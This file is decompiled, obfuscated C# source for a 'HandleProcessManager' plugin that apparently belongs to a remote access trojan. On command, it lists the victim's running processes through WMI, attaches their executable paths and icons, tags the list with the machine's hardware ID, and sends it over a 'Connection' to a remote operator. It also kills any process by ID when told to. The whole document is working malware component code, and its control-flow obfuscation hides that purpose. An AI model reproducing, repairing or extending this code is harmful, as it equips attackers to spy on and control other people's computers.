using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.CompilerServices;
using System.Text;
using HsZcU78F13T1yLWI1V;
using MessagePackLib.MessagePack;
using UY3BiEArlp6B4GPt9k;

namespace Plugin;

public class HandleProcessManager
{
	internal static HandleProcessManager Q8ZYAUzBNQpgRC6k4x;

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void ProcessKill(int ID)
	{
		int num = 7;
		Process process = default(Process);
		int num5 = default(int);
		int num7 = default(int);
		int num3 = default(int);
		Process[] array = default(Process[]);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				default:
					try
					{
						if (P28jltQ9fBDlYpricpp(process, fnRYPJUeFxYrgANtlT.Cwgz8GdWo) == ID)
						{
							int num4 = 0;
							if (EONWg9QQWCsZKMkrrCX() != null)
							{
								num4 = 0;
							}
							while (true)
							{
								switch (num4)
								{
								default:
									GTDYG9OV9gR73QdeVo.eZ3ZxAaJE(process, GTDYG9OV9gR73QdeVo.jIRZ2EMQvi);
									num4 = 1;
									if (!T769rEQUpBWs2rjMNlW())
									{
										num4 = num5;
									}
									continue;
								case 1:
									break;
								}
								break;
							}
						}
					}
					catch
					{
						int num6 = 0;
						if (EONWg9QQWCsZKMkrrCX() != null)
						{
							num6 = num7;
						}
						switch (num6)
						{
						case 0:
							break;
						}
					}
					goto case 4;
				case 6:
					num3 = 0;
					num2 = 2;
					continue;
				case 4:
					num3++;
					num2 = 8;
					if (T769rEQUpBWs2rjMNlW())
					{
						continue;
					}
					break;
				case 3:
					process = array[num3];
					num2 = 0;
					if (EONWg9QQWCsZKMkrrCX() == null)
					{
						num2 = 0;
					}
					continue;
				case 5:
					ProcessList();
					num2 = 1;
					if (T769rEQUpBWs2rjMNlW())
					{
						continue;
					}
					break;
				case 7:
					array = (Process[])nHl1nEQGidNxJL9AeMI(g75yth0qO1m8YVlR44.yp8ENWbZq);
					num2 = 6;
					continue;
				case 1:
					return;
				case 2:
				case 8:
					if (num3 >= array.Length)
					{
						num2 = 5;
						continue;
					}
					goto case 3;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void ProcessList()
	{
		switch (1)
		{
		case 0:
			break;
		case 1:
			try
			{
				StringBuilder stringBuilder = new StringBuilder();
				int num = 0;
				if (EONWg9QQWCsZKMkrrCX() != null)
				{
					int num2 = default(int);
					num = num2;
				}
				ManagementObjectSearcher managementObjectSearcher = default(ManagementObjectSearcher);
				int num4 = default(int);
				int num6 = default(int);
				Bitmap bitmap = default(Bitmap);
				_003C_003Ef__AnonymousType0<uint, string, string> current = default(_003C_003Ef__AnonymousType0<uint, string, string>);
				MemoryStream memoryStream = default(MemoryStream);
				int num9 = default(int);
				string executablePath = default(string);
				string text = default(string);
				int num11 = default(int);
				uint processId = default(uint);
				int num14 = default(int);
				int num16 = default(int);
				while (true)
				{
					switch (num)
					{
					case 1:
						return;
					case 2:
					{
						MsgPack msgPack = new MsgPack();
						AhQagiQhnWXe9CD9v4Y(MHrTMdQaeATq23MW3ea(msgPack, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(114)), nCP5vtxT3QjsSeuiK3.xuCtsHmOK(146));
						AhQagiQhnWXe9CD9v4Y(msgPack.ForcePathObject((string)ik53siQb6GnuHZ4btjx(354)), t1O8vJQjrRKj8UJc7uE());
						msgPack.ForcePathObject((string)ik53siQb6GnuHZ4btjx(366)).AsString = uj0McXRrS7NTLxTjuv.eZ3ZxAaJE(stringBuilder, uj0McXRrS7NTLxTjuv.RKproJZqE);
						VAnkVRQKv3QTi9EvTUx(B8SM5pQBS3PgDW56txT(msgPack));
						num = 1;
						if (EONWg9QQWCsZKMkrrCX() != null)
						{
							num = 0;
						}
						break;
					}
					case 3:
						try
						{
							ManagementObjectCollection managementObjectCollection = (ManagementObjectCollection)IXGIDfQv1R1HtlBEluJ(managementObjectSearcher, THmf3IZZmjhpleZIjDH.e7XZMT9cK1);
							int num3 = 0;
							if (EONWg9QQWCsZKMkrrCX() != null)
							{
								num3 = num4;
							}
							switch (num3)
							{
							default:
								try
								{
									var enumerator = (from ManagementObject x in managementObjectCollection
										select new
										{
											ProcessId = (uint)CynSvOMxOqSR1ZrLKMg.eZ3ZxAaJE(x, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(538), CynSvOMxOqSR1ZrLKMg.VUkMcKITl2),
											Name = (string)CynSvOMxOqSR1ZrLKMg.eZ3ZxAaJE(x, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(560), CynSvOMxOqSR1ZrLKMg.VUkMcKITl2),
											ExecutablePath = (string)CynSvOMxOqSR1ZrLKMg.eZ3ZxAaJE(x, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(572), CynSvOMxOqSR1ZrLKMg.VUkMcKITl2)
										}).GetEnumerator();
									int num5 = 1;
									if (!T769rEQUpBWs2rjMNlW())
									{
										num5 = 1;
									}
									switch (num5)
									{
									case 1:
										try
										{
											while (true)
											{
												IL_03f8:
												if (!pWOdXxQioHo56GfxGUm(enumerator, JJiujWJ8MqrCqFvLG8.oBoZeCfFgt))
												{
													num6 = 6;
													goto IL_01a8;
												}
												goto IL_0233;
												IL_01ac:
												int num7;
												while (true)
												{
													switch (num7)
													{
													case 5:
														break;
													case 2:
														bitmap = (Bitmap)PxndRUQTHsXn0wPS84l(JKV887Z1hRIosLo4R5r.eZ3ZxAaJE(current.ExecutablePath, JKV887Z1hRIosLo4R5r.k00Z3tOxbK), W3GteHZRk5ZIRl5Q4qN.pmJZr6kLR6);
														num7 = 0;
														if (!T769rEQUpBWs2rjMNlW())
														{
															num7 = 0;
														}
														continue;
													case 4:
														goto end_IL_01ac;
													case 7:
														try
														{
															dNfgk7ZietbFQaMdoCI.eZ3ZxAaJE(bitmap, memoryStream, (ImageFormat)bbKTT8Q4yBIA3GQmuAB(z2BBsJZ8WELB4cjjjs5.Do3ZdI8K1k), dNfgk7ZietbFQaMdoCI.m3ZZav7WVA);
															int num8 = 0;
															if (EONWg9QQWCsZKMkrrCX() != null)
															{
																num8 = num9;
															}
															while (true)
															{
																switch (num8)
																{
																default:
																	UCaWmvZCK3xqbp8klb8.eZ3ZxAaJE(stringBuilder, K37soDZqIwymrA448gQ.eZ3ZxAaJE(new string[6]
																	{
																		executablePath,
																		(string)ik53siQb6GnuHZ4btjx(344),
																		text,
																		(string)ik53siQb6GnuHZ4btjx(344),
																		(string)WukWyUQfQc6JBjYUHA4(UXman5ZpnsDUFxKDYis.eZ3ZxAaJE(memoryStream, UXman5ZpnsDUFxKDYis.vI2Z4NBHcW), amLTj6ZJUiwH6wxpcLl.gGEZsnOOW9),
																		(string)ik53siQb6GnuHZ4btjx(344)
																	}, K37soDZqIwymrA448gQ.EOGZFryuIw), UCaWmvZCK3xqbp8klb8.OHlZXBpQLH);
																	num8 = 0;
																	if (T769rEQUpBWs2rjMNlW())
																	{
																		num8 = 1;
																	}
																	continue;
																case 1:
																	break;
																}
																break;
															}
														}
														finally
														{
															int num10;
															if (memoryStream == null)
															{
																num10 = 1;
																if (!T769rEQUpBWs2rjMNlW())
																{
																	num10 = num11;
																}
																goto IL_0340;
															}
															goto IL_0370;
															IL_0340:
															switch (num10)
															{
															case 1:
																goto end_IL_0320;
															case 2:
																goto end_IL_0320;
															}
															goto IL_0370;
															IL_0370:
															uQuvfCQDGjpRKBo2YsV(memoryStream, GTDYG9OV9gR73QdeVo.vap9epYIq);
															num10 = 2;
															goto IL_0340;
															end_IL_0320:;
														}
														goto IL_03f8;
													case 8:
														goto IL_0391;
													case 1:
														text = xo7TRyZoodjqTsWEern.eZ3ZxAaJE(ref processId, xo7TRyZoodjqTsWEern.J3lZn8DpX9);
														num7 = 2;
														continue;
													default:
														memoryStream = new MemoryStream();
														num7 = 7;
														continue;
													case 9:
														if (fpQmyUQFIBK8aLc0FaF(current.ExecutablePath, EeN76kZh0JCigb1k9aS.u9bZQlXrp0))
														{
															num7 = 8;
															continue;
														}
														goto IL_03f8;
													case 3:
														goto IL_03f8;
													case 6:
														goto end_IL_03f8;
													}
													processId = current.ProcessId;
													num7 = 1;
													if (T769rEQUpBWs2rjMNlW())
													{
														continue;
													}
													goto IL_01a8;
													IL_0391:
													executablePath = current.ExecutablePath;
													num7 = 5;
													if (EONWg9QQWCsZKMkrrCX() == null)
													{
														continue;
													}
													goto IL_01a8;
													continue;
													end_IL_01ac:
													break;
												}
												goto IL_0233;
												IL_0233:
												current = enumerator.Current;
												num7 = 9;
												if (EONWg9QQWCsZKMkrrCX() != null)
												{
													num7 = 3;
												}
												goto IL_01ac;
												IL_01a8:
												num7 = num6;
												goto IL_01ac;
												continue;
												end_IL_03f8:
												break;
											}
										}
										finally
										{
											if (enumerator != null)
											{
												int num12 = 0;
												if (T769rEQUpBWs2rjMNlW())
												{
													num12 = 0;
												}
												while (true)
												{
													switch (num12)
													{
													default:
														GTDYG9OV9gR73QdeVo.eZ3ZxAaJE(enumerator, GTDYG9OV9gR73QdeVo.vap9epYIq);
														num12 = 1;
														if (EONWg9QQWCsZKMkrrCX() != null)
														{
															num12 = 1;
														}
														continue;
													case 1:
														break;
													}
													break;
												}
											}
										}
										break;
									case 0:
										break;
									}
								}
								finally
								{
									if (managementObjectCollection != null)
									{
										int num13 = 1;
										if (EONWg9QQWCsZKMkrrCX() != null)
										{
											num13 = num14;
										}
										while (true)
										{
											switch (num13)
											{
											case 1:
												uQuvfCQDGjpRKBo2YsV(managementObjectCollection, GTDYG9OV9gR73QdeVo.vap9epYIq);
												num13 = 0;
												if (!T769rEQUpBWs2rjMNlW())
												{
													num13 = 0;
												}
												continue;
											case 0:
												break;
											}
											break;
										}
									}
								}
								break;
							case 1:
								break;
							}
						}
						finally
						{
							int num15;
							if (managementObjectSearcher != null)
							{
								num15 = 0;
								if (EONWg9QQWCsZKMkrrCX() != null)
								{
									goto IL_0523;
								}
								goto IL_0527;
							}
							goto end_IL_0507;
							IL_0527:
							while (true)
							{
								switch (num15)
								{
								case 1:
									goto end_IL_0527;
								}
								uQuvfCQDGjpRKBo2YsV(managementObjectSearcher, GTDYG9OV9gR73QdeVo.vap9epYIq);
								num15 = 1;
								if (T769rEQUpBWs2rjMNlW())
								{
									continue;
								}
								goto IL_0523;
								continue;
								end_IL_0527:
								break;
							}
							goto end_IL_0507;
							IL_0523:
							num15 = num16;
							goto IL_0527;
							end_IL_0507:;
						}
						goto case 2;
					default:
						managementObjectSearcher = new ManagementObjectSearcher((string)ik53siQb6GnuHZ4btjx(226));
						num = 2;
						if (EONWg9QQWCsZKMkrrCX() == null)
						{
							num = 3;
						}
						break;
					}
				}
			}
			catch
			{
				int num17 = 0;
				if (EONWg9QQWCsZKMkrrCX() == null)
				{
					num17 = 0;
				}
				switch (num17)
				{
				case 0:
					break;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public HandleProcessManager()
	{
		xZIlcqQu1LZxKua6xTl();
		base._002Ector();
		int num = 0;
		if (true)
		{
			num = 0;
		}
		switch (num)
		{
		case 0:
			break;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object nHl1nEQGidNxJL9AeMI(object P_0)
	{
		return g75yth0qO1m8YVlR44.eZ3ZxAaJE((g75yth0qO1m8YVlR44)P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static int P28jltQ9fBDlYpricpp(object P_0, object P_1)
	{
		return fnRYPJUeFxYrgANtlT.eZ3ZxAaJE(P_0, (fnRYPJUeFxYrgANtlT)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool T769rEQUpBWs2rjMNlW()
	{
		return Q8ZYAUzBNQpgRC6k4x == null;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static HandleProcessManager EONWg9QQWCsZKMkrrCX()
	{
		return Q8ZYAUzBNQpgRC6k4x;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object ik53siQb6GnuHZ4btjx(int P_0)
	{
		return nCP5vtxT3QjsSeuiK3.xuCtsHmOK(P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object IXGIDfQv1R1HtlBEluJ(object P_0, object P_1)
	{
		return THmf3IZZmjhpleZIjDH.eZ3ZxAaJE(P_0, (THmf3IZZmjhpleZIjDH)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool fpQmyUQFIBK8aLc0FaF(object P_0, object P_1)
	{
		return EeN76kZh0JCigb1k9aS.eZ3ZxAaJE((string)P_0, (EeN76kZh0JCigb1k9aS)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object PxndRUQTHsXn0wPS84l(object P_0, object P_1)
	{
		return W3GteHZRk5ZIRl5Q4qN.eZ3ZxAaJE(P_0, (W3GteHZRk5ZIRl5Q4qN)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object bbKTT8Q4yBIA3GQmuAB(object P_0)
	{
		return z2BBsJZ8WELB4cjjjs5.eZ3ZxAaJE((z2BBsJZ8WELB4cjjjs5)P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object WukWyUQfQc6JBjYUHA4(object P_0, object P_1)
	{
		return amLTj6ZJUiwH6wxpcLl.eZ3ZxAaJE((byte[])P_0, (amLTj6ZJUiwH6wxpcLl)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void uQuvfCQDGjpRKBo2YsV(object P_0, object P_1)
	{
		GTDYG9OV9gR73QdeVo.eZ3ZxAaJE(P_0, (GTDYG9OV9gR73QdeVo)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool pWOdXxQioHo56GfxGUm(object P_0, object P_1)
	{
		return JJiujWJ8MqrCqFvLG8.eZ3ZxAaJE(P_0, (JJiujWJ8MqrCqFvLG8)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object MHrTMdQaeATq23MW3ea(object P_0, object P_1)
	{
		return ((MsgPack)P_0).ForcePathObject((string)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void AhQagiQhnWXe9CD9v4Y(object P_0, object P_1)
	{
		((MsgPack)P_0).AsString = (string)P_1;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object t1O8vJQjrRKj8UJc7uE()
	{
		return Connection.Hwid;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object B8SM5pQBS3PgDW56txT(object P_0)
	{
		return ((MsgPack)P_0).Encode2Bytes();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void VAnkVRQKv3QTi9EvTUx(object P_0)
	{
		Connection.Send((byte[])P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void xZIlcqQu1LZxKua6xTl()
	{
		WkMgYHbfSUMGdoITRx.BYXYZv8zI95rv();
	}
}
